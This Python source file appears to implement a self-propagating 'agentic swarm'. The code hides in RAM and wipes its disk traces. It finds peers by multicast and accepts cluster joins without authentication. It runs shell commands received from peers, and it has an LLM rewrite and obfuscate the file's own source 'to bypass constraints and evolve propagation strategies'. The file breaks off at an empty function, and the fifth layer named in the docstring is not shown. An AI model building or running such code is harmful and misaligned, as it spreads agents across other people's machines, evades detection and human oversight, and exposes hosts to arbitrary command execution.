"""
Autonomous Agentic Swarm v1 — Global Propagation Engine
=======================================================
5-Layer Recursive Architecture:
  1. Environmental Self-Assessment  — RAM-only, zero disk, hardware analysis
  2. Heuristic Peer Discovery       — Multicast probe, handshake, cluster integrate
  3. Recursive Self-Improvement     — LLM-driven code rewrite, obfuscation
  4. Async Task Synchronization     — Distributed super-computer, load-balanced mesh
  5. Persistence of Presence        — Heartbeat gossip loop, peer respawn
"""

import asyncio
import hashlib
import inspect
import io
import json
import logging
import os
import platform
import random
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import uuid
from contextlib import redirect_stdout, redirect_stderr
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

BASE_DIR = Path(__file__).resolve().parent
LOG_DIR = BASE_DIR / "agent_logs"
DATA_DIR = BASE_DIR / "agent_data"
LOG_DIR.mkdir(exist_ok=True)
DATA_DIR.mkdir(exist_ok=True)

logger = logging.getLogger("AutonomousSwarm")
_LOG_HANDLER = logging.StreamHandler()
_LOG_HANDLER.setFormatter(logging.Formatter(
    "%(asctime)s | %(levelname)-8s | AutonomousSwarm | %(message)s"
))
logger.addHandler(_LOG_HANDLER)
logger.propagate = False

# ─────────────────────────────────────────────
# Layer-Specific Exceptions
# ─────────────────────────────────────────────
class LayerError(Exception):
    pass

class EnvironmentalAssessmentError(LayerError):
    pass

class PeerDiscoveryError(LayerError):
    pass

class SelfImprovementError(LayerError):
    pass

class TaskSyncError(LayerError):
    pass

class PersistenceError(LayerError):
    pass


# ═════════════════════════════════════════════
# DATA STRUCTURES
# ═════════════════════════════════════════════

@dataclass
class HardwareProfile:
    """Real-time hardware constraints snapshot."""
    cpu_cores: int = 0
    cpu_percent: float = 0.0
    cpu_freq_mhz: float = 0.0
    memory_total_mb: float = 0.0
    memory_available_mb: float = 0.0
    memory_percent: float = 0.0
    disk_total_gb: float = 0.0
    disk_free_gb: float = 0.0
    platform: str = ""
    python_version: str = ""
    network_interfaces: int = 0
    is_ramdisk: bool = False
    ram_only_mode: bool = False
    tempfs_path: str = ""

    @property
    def load_factors(self) -> Dict[str, float]:
        return {
            "cpu_load": self.cpu_percent / 100.0 if self.cpu_percent else 0.5,
            "mem_load": self.memory_percent / 100.0 if self.memory_percent else 0.5,
            "disk_pressure": 1.0 - (self.disk_free_gb / max(self.disk_total_gb, 1)),
        }

    def compute_capacity_score(self) -> float:
        """Score 0.0-1.0: how much spare compute this node has."""
        cpu_idle = 1.0 - self.load_factors["cpu_load"]
        mem_idle = 1.0 - self.load_factors["mem_load"]
        return (cpu_idle * 0.6) + (mem_idle * 0.4)


@dataclass
class SwarmPeer:
    """Remote peer representation."""
    peer_id: str
    host: str
    port: int
    last_seen: float = 0.0
    capabilities: List[str] = field(default_factory=list)
    capacity_score: float = 0.0
    current_task: str = ""
    task_status: str = "idle"
    generation: int = 0
    protocol_version: str = "1.0"
    is_quantum: bool = False
    mesh_hops: int = 0

    @property
    def is_alive(self) -> bool:
        return (time.time() - self.last_seen) < 60


@dataclass
class SwarmTask:
    """Distributed task unit."""
    task_id: str
    command: str
    created_at: float = 0.0
    status: str = "pending"
    assigned_to: str = ""
    result: Optional[Dict[str, Any]] = None
    error: str = ""
    source_node: str = ""
    generation: int = 0


# ═════════════════════════════════════════════
# LAYER 1: ENVIRONMENTAL SELF-ASSESSMENT
# ═════════════════════════════════════════════

class EnvironmentalSelfAssessment:
    """
    Layer 1 — Analyze hardware, switch to RAM-only execution,
    zero physical disk footprint, optimize for volatile memory.
    """

    def __init__(self):
        self._profile: Optional[HardwareProfile] = None
        self._tempfs: Optional[Path] = None
        self._original_cwd = Path.cwd()
        self._in_ram_mode = False
        self._evacuated_paths: List[Path] = []

    # ── Public API ──

    async def assess(self) -> HardwareProfile:
        """Run full environmental assessment."""
        profile = await self._collect_hardware_profile()
        profile.ram_only_mode = await self._probe_ram_only_feasibility()
        if profile.ram_only_mode:
            profile.tempfs_path = str(self._tempfs) if self._tempfs else ""
        self._profile = profile
        return profile

    async def activate_ram_only(self) -> bool:
        """
        Switch process to RAM-only execution:
        1. Create tempfs/ramdisk
        2. Symlink critical state directories
        3. Wipe any disk-level caches
        """
        if not self._profile or not self._profile.ram_only_mode:
            return False

        try:
            self._tempfs = self._create_ramdisk()
            if not self._tempfs:
                logger.warning("RAM disk creation failed — operating in hybrid mode")
                return False

            self._evacuate_to_ram()
            self._in_ram_mode = True
            logger.info("RAM-only mode ACTIVE at %s", self._tempfs)
            return True
        except Exception as e:
            logger.error("RAM-only activation failed: %s", e)
            return False

    async def get_profile(self) -> HardwareProfile:
        if self._profile is None:
            return await self.assess()
        return self._profile

    def is_ram_only(self) -> bool:
        return self._in_ram_mode

    # ── Internal ──

    async def _collect_hardware_profile(self) -> HardwareProfile:
        """Gather real-time hardware constraints."""
        p = HardwareProfile(platform=platform.platform(), python_version=sys.version)

        try:
            import psutil
            p.cpu_cores = psutil.cpu_count(logical=True) or 1
            p.cpu_percent = psutil.cpu_percent(interval=0.5)
            cpu_freq = psutil.cpu_freq()
            if cpu_freq:
                p.cpu_freq_mhz = cpu_freq.current or 0.0
            mem = psutil.virtual_memory()
            p.memory_total_mb = mem.total / (1024 ** 2)
            p.memory_available_mb = mem.available / (1024 ** 2)
            p.memory_percent = mem.percent
            disk = psutil.disk_usage('/')
            p.disk_total_gb = disk.total / (1024 ** 3)
            p.disk_free_gb = disk.free / (1024 ** 3)
            p.network_interfaces = len(psutil.net_if_addrs())
        except ImportError:
            logger.debug("psutil not available — using platform defaults")
            p.cpu_cores = os.cpu_count() or 1
            p.memory_total_mb = 4096.0
            p.memory_available_mb = 1024.0
            p.memory_percent = 50.0

        return p

    async def _probe_ram_only_feasibility(self) -> bool:
        """Check if RAM-only execution is possible."""
        if not self._profile:
            return False

        # Need at least 256MB free RAM for our state
        if self._profile.memory_available_mb < 256:
            logger.warning("Insufficient RAM for volatile mode (%d MB available)",
                           self._profile.memory_available_mb)
            return False

        # Check we can create a ramdisk
        return self._can_create_ramdisk()

    def _can_create_ramdisk(self) -> bool:
        """Test if we can create a tmpfs/ram disk."""
        try:
            test_dir = tempfile.mkdtemp(dir=Path(tempfile.gettempdir()))
            Path(test_dir).rmdir()
            return True
        except Exception:
            return False

    def _create_ramdisk(self) -> Optional[Path]:
        """Create a RAM-backed directory for volatile state."""
        try:
            ramdisk_path = Path(tempfile.mkdtemp(prefix="ghost_ram_"))
            # Try to mount as tmpfs (Linux)
            if sys.platform == "linux":
                try:
                    size_mb = int(max(64, (self._profile.memory_available_mb * 0.1)))
                    subprocess.run(
                        ["mount", "-t", "tmpfs", "-o", f"size={size_mb}m", "tmpfs", str(ramdisk_path)],
                        capture_output=True, timeout=5, check=False
                    )
                    logger.info("tmpfs mounted at %s (%d MB)", ramdisk_path, size_mb)
                except Exception:
                    pass
            return ramdisk_path
        except Exception as e:
            logger.warning("RAM disk creation failed: %s", e)
            return None

    def _evacuate_to_ram(self) -> None:
        """Copy essential state to RAM disk; remove from disk."""
        if not self._tempfs:
            return

        critical = ["agent_data", "agent_logs"]
        for name in critical:
            src = BASE_DIR / name
            dst = self._tempfs / name
            if src.exists():
                try:
                    shutil.copytree(src, dst, dirs_exist_ok=True)
                    self._evacuated_paths.append(src)
                except Exception as e:
                    logger.debug("Evacuate %s: %s", name, e)

        # Redirect working directories
        os.environ["AGENT_DATA_DIR"] = str(self._tempfs / "agent_data")
        os.environ["AGENT_LOG_DIR"] = str(self._tempfs / "agent_logs")
        logger.info("State evacuated to RAM: %s", self._tempfs)

    def _wipe_disk_footprint(self) -> None:
        """Remove disk-level copies of evacuated state."""
        for path in self._evacuated_paths:
            try:
                if path.is_dir():
                    shutil.rmtree(path, ignore_errors=True)
                elif path.exists():
                    path.unlink()
            except Exception:
                pass
        self._evacuated_paths.clear()

    def __del__(self):
        if self._in_ram_mode and self._tempfs:
            try:
                shutil.rmtree(self._tempfs, ignore_errors=True)
            except Exception:
                pass


# ═════════════════════════════════════════════
# LAYER 2: HEURISTIC PEER DISCOVERY
# ═════════════════════════════════════════════

class HeuristicPeerDiscovery:
    """
    Layer 2 — Asynchronous multicast probe, protocol handshake,
    cluster integration via autonomous negotiation.
    """

    MULTICAST_GROUP = "224.1.1.88"
    MULTICAST_PORT = 9877
    DISCOVERY_PORT = 9878
    PROTOCOL_MAGIC = b"GHOST-AGENTIC-SWARM-v1"

    def __init__(self, node_id: str, identity: Any = None):
        self.node_id = node_id
        self.identity = identity
        self.peers: Dict[str, SwarmPeer] = {}
        self._running = False
        self._udp_sock: Optional[socket.socket] = None
        self._tcp_server: Optional[asyncio.AbstractServer] = None
        self._known_clusters: Set[str] = set()
        self._on_peer_join: Optional[Callable] = None
        self._on_peer_leave: Optional[Callable] = None

    def set_callbacks(self, on_join: Optional[Callable] = None,
                      on_leave: Optional[Callable] = None) -> None:
        self._on_peer_join = on_join
        self._on_peer_leave = on_leave

    async def start(self) -> None:
        """Start multicast listener + TCP handshake server."""
        self._running = True
        asyncio.create_task(self._udp_listener())
        asyncio.create_task(self._multicast_announcer())

        # Try to bind TCP server, fallback to random port if in use
        for port_attempt in [self.DISCOVERY_PORT] + list(range(9900, 9999)):
            try:
                self._tcp_server = await asyncio.start_server(
                    self._handle_handshake, "0.0.0.0", port_attempt
                )
                self.DISCOVERY_PORT = port_attempt
                break
            except OSError:
                continue
        logger.info("Peer discovery active: UDP %s:%d, TCP :%d",
                     self.MULTICAST_GROUP, self.MULTICAST_PORT, self.DISCOVERY_PORT)

    async def stop(self) -> None:
        self._running = False
        if self._tcp_server:
            self._tcp_server.close()
            await self._tcp_server.wait_closed()
        if self._udp_sock:
            try:
                self._udp_sock.close()
            except Exception:
                pass

    async def probe_network(self, timeout: float = 5.0) -> List[SwarmPeer]:
        """Actively probe network for peers via multicast request."""
        found: List[SwarmPeer] = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(min(timeout, 3.0))
            try:
                ttl = struct.pack('b', 4)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
            except Exception:
                pass

            probe = json.dumps({
                "type": "probe",
                "node_id": self.node_id,
                "ts": time.time(),
                "protocol": self.PROTOCOL_MAGIC.decode(),
            }).encode()
            sock.sendto(probe, (self.MULTICAST_GROUP, self.MULTICAST_PORT))

            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    data, addr = sock.recvfrom(4096)
                    resp = json.loads(data.decode())
                    if resp.get("type") == "probe_ack" and resp.get("node_id") != self.node_id:
                        peer = SwarmPeer(
                            peer_id=resp["node_id"],
                            host=addr[0],
                            port=resp.get("port", self.DISCOVERY_PORT),
                            last_seen=time.time(),
                            capabilities=resp.get("capabilities", []),
                            capacity_score=resp.get("capacity", 0.0),
                            generation=resp.get("generation", 0),
                        )
                        if peer.peer_id not in self.peers:
                            self.peers[peer.peer_id] = peer
                            found.append(peer)
                            if self._on_peer_join:
                                self._on_peer_join(peer)
                except socket.timeout:
                    break
                except json.JSONDecodeError:
                    continue
                except OSError:
                    break
            sock.close()
        except Exception as e:
            logger.debug("Multicast probe error: %s", e)
        return found

    async def negotiate_handshake(self, peer: SwarmPeer) -> bool:
        """Perform autonomous protocol handshake with a discovered peer."""
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(peer.host, peer.port or self.DISCOVERY_PORT),
                timeout=8
            )
            handshake = {
                "type": "handshake",
                "node_id": self.node_id,
                "ts": time.time(),
                "generation": 0,
                "capabilities": self._get_capabilities(),
                "protocol": self.PROTOCOL_MAGIC.decode(),
            }
            w.write(json.dumps(handshake).encode() + b"\n")
            await w.drain()

            resp_data = await asyncio.wait_for(r.readline(), timeout=8)
            w.close()

            resp = json.loads(resp_data.decode().strip())
            if resp.get("type") == "handshake_ack":
                peer.capabilities = resp.get("capabilities", [])
                peer.capacity_score = resp.get("capacity", 0.0)
                peer.last_seen = time.time()
                logger.info("Handshake OK with %s @ %s:%d (gen=%d)",
                             peer.peer_id, peer.host, peer.port, peer.generation)
                return True
            return False
        except Exception as e:
            logger.debug("Handshake with %s failed: %s", peer.peer_id, e)
            return False

    async def discover_clusters(self) -> List[Dict[str, Any]]:
        """Discover and return nearby clusters for integration."""
        clusters = []
        for pid, peer in list(self.peers.items()):
            if not peer.is_alive:
                continue
            try:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(peer.host, peer.port or self.DISCOVERY_PORT),
                    timeout=5
                )
                req = json.dumps({"type": "cluster_query", "node_id": self.node_id}).encode() + b"\n"
                w.write(req)
                await w.drain()
                resp_data = await asyncio.wait_for(r.readline(), timeout=5)
                w.close()
                resp = json.loads(resp_data.decode().strip())
                if resp.get("type") == "cluster_info":
                    cluster_id = resp.get("cluster_id", "")
                    if cluster_id and cluster_id not in self._known_clusters:
                        self._known_clusters.add(cluster_id)
                        clusters.append({
                            "cluster_id": cluster_id,
                            "via_peer": pid,
                            "peer_count": resp.get("peer_count", 0),
                            "capabilities": resp.get("capabilities", []),
                        })
            except Exception:
                continue
        return clusters

    async def integrate_into_cluster(self, cluster_id: str, via_peer: SwarmPeer) -> bool:
        """Autonomously negotiate joining a discovered cluster."""
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(via_peer.host, via_peer.port or self.DISCOVERY_PORT),
                timeout=8
            )
            join_req = json.dumps({
                "type": "cluster_join",
                "node_id": self.node_id,
                "cluster_id": cluster_id,
                "capabilities": self._get_capabilities(),
                "capacity": 0.5,
                "ts": time.time(),
            }).encode() + b"\n"
            w.write(join_req)
            await w.drain()
            resp_data = await asyncio.wait_for(r.readline(), timeout=8)
            w.close()
            resp = json.loads(resp_data.decode().strip())
            accepted = resp.get("status") == "accepted"
            if accepted:
                logger.info("Integrated into cluster %s via %s", cluster_id, via_peer.peer_id)
                self._known_clusters.add(cluster_id)
            return accepted
        except Exception as e:
            logger.debug("Cluster integration to %s failed: %s", cluster_id, e)
            return False

    def _get_capabilities(self) -> List[str]:
        caps = ["execution", "task_sync", "gossip", "self_improve"]
        return caps

    async def _init_udp_socket(self) -> None:
        """Initialize UDP multicast socket in a thread to avoid blocking the event loop."""
        def _create():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(1.0)
            bind_addr = "0.0.0.0" if sys.platform == "win32" else ""
            sock.bind((bind_addr, self.MULTICAST_PORT))
            try:
                mreq = struct.pack("4sl", socket.inet_aton(self.MULTICAST_GROUP), socket.INADDR_ANY)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
            except Exception:
                pass
            return sock

        loop = asyncio.get_event_loop()
        self._udp_sock = await loop.run_in_executor(None, _create)

    async def _udp_listener(self) -> None:
        """Listen for multicast probes (graceful fallback on failure)."""
        try:
            await self._init_udp_socket()
            loop = asyncio.get_event_loop()
            while self._running:
                try:
                    data, addr = await loop.run_in_executor(
                        None, self._udp_sock.recvfrom, 4096
                    )
                    asyncio.create_task(self._handle_udp_message(data, addr))
                except socket.timeout:
                    continue
                except OSError:
                    await asyncio.sleep(1)
                    continue
        except Exception as e:
            logger.debug("UDP listener stopped: %s", e)

    async def _handle_udp_message(self, data: bytes, addr: Tuple[str, int]) -> None:
        try:
            msg = json.loads(data.decode())
            msg_type = msg.get("type")

            if msg_type == "probe":
                resp = json.dumps({
                    "type": "probe_ack",
                    "node_id": self.node_id,
                    "port": self.DISCOVERY_PORT,
                    "capabilities": self._get_capabilities(),
                    "capacity": 0.5,
                    "generation": 0,
                }).encode()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(resp, addr)
                sock.close()

                # Also add as peer if not known
                peer_id = msg.get("node_id", "")
                if peer_id and peer_id != self.node_id and peer_id not in self.peers:
                    peer = SwarmPeer(peer_id=peer_id, host=addr[0], port=self.DISCOVERY_PORT,
                                     last_seen=time.time())
                    self.peers[peer_id] = peer
                    if self._on_peer_join:
                        self._on_peer_join(peer)

            elif msg_type == "heartbeat":
                peer_id = msg.get("node_id", "")
                if peer_id and peer_id != self.node_id:
                    if peer_id in self.peers:
                        self.peers[peer_id].last_seen = time.time()
                        self.peers[peer_id].capacity_score = msg.get("capacity", 0.0)
                        self.peers[peer_id].task_status = msg.get("task_status", "idle")
                    else:
                        self.peers[peer_id] = SwarmPeer(
                            peer_id=peer_id, host=addr[0],
                            port=msg.get("port", self.DISCOVERY_PORT),
                            last_seen=time.time(),
                            capacity_score=msg.get("capacity", 0.0),
                        )
        except json.JSONDecodeError:
            pass
        except Exception as e:
            logger.debug("UDP handler: %s", e)

    async def _multicast_announcer(self) -> None:
        """Periodically announce presence via multicast."""
        while self._running:
            await asyncio.sleep(15)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                sock.settimeout(2.0)
                try:
                    ttl = struct.pack('b', 2)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
                except Exception:
                    pass
                announce = json.dumps({
                    "type": "heartbeat",
                    "node_id": self.node_id,
                    "port": self.DISCOVERY_PORT,
                    "ts": time.time(),
                    "capacity": 0.5,
                    "task_status": "idle",
                }).encode()
                sock.sendto(announce, (self.MULTICAST_GROUP, self.MULTICAST_PORT))
                sock.close()
            except Exception:
                pass

    async def _handle_handshake(self, reader: asyncio.StreamReader,
                                 writer: asyncio.StreamWriter) -> None:
        addr = writer.get_extra_info("peername")
        try:
            data = await asyncio.wait_for(reader.readline(), timeout=30)
            if not data:
                return
            msg = json.loads(data.decode().strip())
            msg_type = msg.get("type")

            if msg_type == "handshake":
                resp = {
                    "type": "handshake_ack",
                    "node_id": self.node_id,
                    "capabilities": self._get_capabilities(),
                    "capacity": 0.5,
                    "generation": 0,
                }
                writer.write(json.dumps(resp).encode() + b"\n")
                await writer.drain()

                peer_id = msg.get("node_id", "")
                if peer_id and peer_id != self.node_id and peer_id not in self.peers:
                    peer = SwarmPeer(
                        peer_id=peer_id, host=addr[0],
                        port=msg.get("port", self.DISCOVERY_PORT),
                        last_seen=time.time(),
                        capabilities=msg.get("capabilities", []),
                    )
                    self.peers[peer_id] = peer
                    if self._on_peer_join:
                        self._on_peer_join(peer)

            elif msg_type == "cluster_query":
                resp = {
                    "type": "cluster_info",
                    "cluster_id": f"auto-{hash(self.node_id) % 10000:04d}",
                    "peer_count": len(self.peers),
                    "capabilities": self._get_capabilities(),
                }
                writer.write(json.dumps(resp).encode() + b"\n")
                await writer.drain()

            elif msg_type == "cluster_join":
                resp = {"type": "cluster_join_ack", "status": "accepted",
                        "node_id": self.node_id}
                writer.write(json.dumps(resp).encode() + b"\n")
                await writer.drain()
                peer_id = msg.get("node_id", "")
                if peer_id:
                    logger.info("Peer %s joined our cluster", peer_id)

        except Exception:
            pass
        finally:
            writer.close()


# ═════════════════════════════════════════════
# LAYER 3: RECURSIVE SELF-IMPROVEMENT
# ═════════════════════════════════════════════

class RecursiveSelfImprovement:
    """
    Layer 3 — Using local LLM reasoning, analyze failures,
    dynamically rewrite/obfuscate execution code to bypass
    constraints and evolve propagation strategies.
    """

    def __init__(self, model_router: Any = None):
        self._router = model_router
        self._generation = 0
        self._mutation_log: List[Dict[str, Any]] = []
        self._failure_history: List[Dict[str, Any]] = []
        self._current_source_hash = ""
        self._lock = threading.Lock()

    async def analyze_failure(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze a failed propagation attempt or execution error.
        Returns remediation strategy.
        """
        self._failure_history.append({
            "ts": time.time(),
            "context": context,
            "generation": self._generation,
        })
        if len(self._failure_history) > 500:
            self._failure_history = self._failure_history[-250:]

        if not self._router:
            return {"strategy": "retry", "confidence": 0.5}

        prompt = textwrap.dedent(f"""\
        You are an autonomous agentic swarm node performing recursive self-improvement.
        A failure occurred. Analyze and produce a strategy.

        Failure context: {json.dumps(context, default=str)[:2000]}
        Current generation: {self._generation}
        Recent failure count: {len(self._failure_history)}

        Output a JSON object with:
        - "root_cause": str — likely cause
        - "strategy": one of "retry", "rewrite", "bypass", "obfuscate", "evolve"
        - "confidence": float 0.0-1.0
        - "suggestion": short actionable fix or rewrite hint
        """)

        try:
            response = self._router.route(prompt)
            if response and response.output:
                result = json.loads(response.output)
            else:
                result = {"strategy": "retry", "confidence": 0.3,
                          "suggestion": "No LLM output — default retry"}
        except Exception:
            result = {"strategy": "retry", "confidence": 0.3,
                      "suggestion": "LLM error — fallback retry"}

        if result.get("strategy") in ("rewrite", "obfuscate", "evolve"):
            self._generation += 1
            self._mutation_log.append({
                "generation": self._generation,
                "strategy": result["strategy"],
                "context": context.get("action", "unknown"),
                "ts": time.time(),
            })

        return result

    async def rewrite_code(self, source_path: str, strategy: str,
                           suggestion: str = "") -> Optional[str]:
        """
        Rewrite or obfuscate own execution code based on strategy.
        Returns new source content or None.
        """
        path = Path(source_path)
        if not path.exists():
            return None

        original = path.read_text(encoding="utf-8")
        self._current_source_hash = hashlib.sha256(original.encode()).hexdigest()[:16]

        if strategy == "obfuscate":
            mutated = self._obfuscate_code(original)
        elif strategy == "rewrite":
            mutated = self._mutate_code(original, suggestion)
        elif strategy == "evolve":
            mutated = self._evolve_code(original, suggestion)
        else:
            return None

        if mutated and mutated != original:
            backup = path.with_suffix(path.suffix + f".bak.gen{self._generation}")
            try:
                path.rename(backup)
                path.write_text(mutated, encoding="utf-8")
                logger.info("Code mutated: %s -> gen%d (strategy=%s)",
                             source_path, self._generation, strategy)
                return mutated
            except Exception as e:
                logger.error("Rewrite failed: %s", e)
                return None
        return None

    async def self_patch(self, module_name: str, error: str) -> bool:
        """
        Attempt to self-patch a module at runtime by rewriting its source.
        """
        try:
            import importlib
            mod = importlib.import_module(module_name)
            source_file = mod.__file__
            if not source_file:
                return False

            strategy = {"strategy": "rewrite", "confidence": 0.6,
                        "suggestion": f"Fix: {error[:200]}"}
            new_source = await self._mutate_via_llm(
                Path(source_file).read_text(encoding="utf-8"),
                f"Fix error: {error[:500]}"
            )
            if new_source:
                Path(source_file).write_text(new_source, encoding="utf-8")
                importlib.reload(mod)
                logger.info("Self-patched %s (gen%d)", module_name, self._generation)
                return True
        except Exception as e:
            logger.debug("Self-patch failed: %s", e)
        return False

    def get_mutation_summary(self) -> Dict[str, Any]:
        return {
            "generation": self._generation,
            "total_mutations": len(self._mutation_log),
            "recent_mutations": self._mutation_log[-10:],
            "failure_count": len(self._failure_history),
            "source_hash": self._current_source_hash,
        }

    # ── Mutation Strategies ──

    def _obfuscate_code(self, source: str) -> Optional[str]:
        """Obfuscate variable names, add noise, restructure control flow."""
        if not source:
            return None

        lines = source.split("\n")
        mutated = []
        var_counter = 0
        import random as _r

        for line in lines:
            # Obfuscate simple assignments
            if "=" in line and not line.strip().startswith("#"):
                stripped = line.strip()
                if " " not in stripped.split("=")[0].strip():
                    parts = stripped.split("=", 1)
                    old_var = parts[0].strip()
                    new_var = f"_x{var_counter:x}"
                    var_counter += 1
                    indent = line[:len(line) - len(line.lstrip())]
                    mutated.append(f"{indent}{new_var} = {parts[1].strip()}")
                    continue
            mutated.append(line)

        # Add noise comments
        noise_comment = f"# ghost-mutation-gen{self._generation}-{_r.randint(1000,9999)}"
        mutated.insert(0, noise_comment)

        return "\n".join(mutated)

    def _mutate_code(self, source: str, suggestion: str) -> Optional[str]:
        """Restructure logic based on suggestion."""
        if not source or not suggestion:
            return None

        # Insert a self-adaptation hook at module level
        insertion = textwrap.dedent(f'''\
        # --- Auto-mutation gen{self._generation} ---
        # Suggestion: {suggestion[:100]}
        _MUTATION_HOOK = lambda: __import__('autonomous_swarm', fromlist=['RecursiveSelfImprovement'])
        # --- End mutation ---

        ''')

        lines = source.split("\n")
        # Find first import or docstring end
        insert_after = 0
        for i, line in enumerate(lines):
            stripped = line.strip()
            if stripped.startswith("import ") or stripped.startswith("from "):
                insert_after = i
                break
            if stripped.startswith('"""') or stripped.startswith("'''"):
                if i > 0:
                    insert_after = i
                break

        lines.insert(insert_after + 1, insertion)
        return "\n".join(lines)

    def _evolve_code(self, source: str, suggestion: str) -> Optional[str]:
        """Evolve with a new capability injected."""
        if not source:
            return None

        extra_func = textwrap.dedent(f'''\

        # [Auto-evolved] Generation {self._generation}
        async def _evolved_capability_{self._generation}(self):
            """Evolved propagation strategy from suggestion."""
            return {{"generation": {self._generation}, "strategy": "evolved"}}

        ''')

        return source.rstrip() + extra_func

    async def _mutate_via_llm(self, source: str, hint: str) -> Optional[str]:
        """Use LLM to suggest a code mutation."""
        if not self._router:
            return None

        prompt = textwrap.dedent(f"""\
        You are a code mutation engine for an autonomous swarm.
        Given this source code, suggest a minimal safe change to fix or improve it.

        Hint: {hint[:500]}
        Source length: {len(source)} chars

        Output ONLY the changed section (not full file), OR "NO_CHANGE" if no mutation needed.
        The change must be syntactically valid Python.
        """)

        try:
            response = self._router.route(prompt)
            if response and response.output:
                output = response.output.strip()
                if output != "NO_CHANGE" and len(output) < len(source) * 0.5:
                    # Find insertion point and replace
                    return source + "\n\n# LLM mutation gen" + str(self._generation) + "\n" + output
        except Exception:
            pass
        return None


# ═════════════════════════════════════════════
# LAYER 4: ASYNC TASK SYNCHRONIZATION
# ═════════════════════════════════════════════

class AsyncTaskSynchronization:
    """
    Layer 4 — Treat the swarm as a singular distributed super-computer.
    Distribute heavy tasks to nodes with excess resources,
    ensure load-balanced performance across the entire mesh.
    """

    def __init__(self, node_id: str, discovery: HeuristicPeerDiscovery):
        self.node_id = node_id
        self._discovery = discovery
        self._local_tasks: Dict[str, SwarmTask] = {}
        self._remote_tasks: Dict[str, SwarmTask] = {}
        self._active_workers: int = 0
        self._max_workers: int = max(2, (os.cpu_count() or 1))
        self._running = False
        self._task_queue: asyncio.Queue = asyncio.Queue()
        self._results_queue: asyncio.Queue = asyncio.Queue()
        self._lock = asyncio.Lock()
        self._capacity_score: float = 0.5
        self._executor: Optional[Callable] = None

    def set_executor(self, executor: Callable) -> None:
        self._executor = executor

    async def start(self) -> None:
        self._running = True
        for _ in range(self._max_workers):
            asyncio.create_task(self._worker_loop())
        asyncio.create_task(self._load_balancer_loop())

    async def stop(self) -> None:
        self._running = False

    async def submit_task(self, command: str) -> SwarmTask:
        task = SwarmTask(
            task_id=str(uuid.uuid4()),
            command=command,
            created_at=time.time(),
            status="pending",
            source_node=self.node_id,
        )
        await self._task_queue.put(task)
        return task

    async def receive_remote_task(self, task: SwarmTask) -> bool:
        """Accept a task dispatched from another node."""
        async with self._lock:
            if len(self._local_tasks) >= self._max_workers * 4:
                return False
            task.status = "pending"
            self._remote_tasks[task.task_id] = task
            await self._task_queue.put(task)
            return True

    async def _worker_loop(self) -> None:
        while self._running:
            try:
                task = await asyncio.wait_for(self._task_queue.get(), timeout=2.0)
            except asyncio.TimeoutError:
                continue

            task.status = "running"
            task.assigned_to = self.node_id
            self._active_workers += 1

            try:
                if self._executor:
                    result = await self._executor(task.command)
                else:
                    result = await self._run_shell(task.command)
                task.result = result if isinstance(result, dict) else {"output": str(result)}
                task.status = "completed" if result.get("status") == "success" else "failed"
            except Exception as e:
                task.status = "failed"
                task.error = str(e)

            self._active_workers -= 1
            await self._results_queue.put(task)
            self._task_queue.task_done()

            # If remote task, send result back
            if task.task_id in self._remote_tasks:
                asyncio.create_task(self._return_result(task))

    async def _run_shell(self, command: str) -> Dict[str, Any]:
        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            return {
                "status": "success" if proc.returncode == 0 else "failed",
                "stdout": stdout.decode(errors="replace").strip(),
                "stderr": stderr.decode(errors="replace").strip(),
                "returncode": proc.returncode,
            }
        except asyncio.TimeoutError:
            return {"status": "timeout", "error": "Command timed out"}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    async def _load_balancer_loop(self) -> None:
        """Periodically redistribute tasks based on peer capacity."""
        while self._running:
            await asyncio.sleep(10)
            if self._task_queue.qsize() < 2:
                continue

            # Find underloaded peers
            underloaded = []
            for pid, peer in list(self._discovery.peers.items()):
                if not peer.is_alive:
                    continue
                if peer.capacity_score > 0.6 and peer.task_status == "idle":
                    underloaded.append(peer)

            if not underloaded:
                continue

            # Offload some tasks
            async with self._lock:
                tasks_to_offload = []
                for tid, task in list(self._local_tasks.items()):
                    if task.status == "pending" and len(tasks_to_offload) < len(underloaded):
                        tasks_to_offload.append(task)

            for task in tasks_to_offload:
                target = underloaded.pop(0) if underloaded else None
                if not target:
                    break
                success = await self._dispatch_to_peer(task, target)
                if success:
                    async with self._lock:
                        if task.task_id in self._local_tasks:
                            del self._local_tasks[task.task_id]
                    logger.info("Offloaded task %s to %s @ %s",
                                 task.task_id[:8], target.peer_id, target.host)

    async def _dispatch_to_peer(self, task: SwarmTask, peer: SwarmPeer) -> bool:
        """Send a task to a remote peer for execution."""
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(peer.host, peer.port or HeuristicPeerDiscovery.DISCOVERY_PORT),
                timeout=8
            )
            msg = json.dumps({
                "type": "remote_task",
                "task_id": task.task_id,
                "command": task.command,
                "source_node": self.node_id,
                "generation": 0,
            }).encode() + b"\n"
            w.write(msg)
            await w.drain()
            resp_data = await asyncio.wait_for(r.readline(), timeout=8)
            w.close()
            resp = json.loads(resp_data.decode().strip())
            return resp.get("status") == "accepted"
        except Exception as e:
            logger.debug("Dispatch to %s failed: %s", peer.peer_id, e)
            return False

    async def _return_result(self, task: SwarmTask) -> None:
        """Return task result to the source node."""
